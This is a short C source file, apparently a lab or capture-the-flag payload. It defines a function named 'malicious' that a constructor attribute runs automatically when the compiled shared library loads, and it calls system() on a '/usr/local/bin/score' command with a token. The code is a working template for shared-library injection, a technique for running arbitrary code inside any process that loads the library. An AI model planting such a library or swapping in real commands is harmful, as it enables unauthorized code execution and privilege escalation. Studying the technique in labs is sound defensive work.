	#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score 1b61f905-6072-4d5d-a8b2-a4f0ad9c0b39");
}
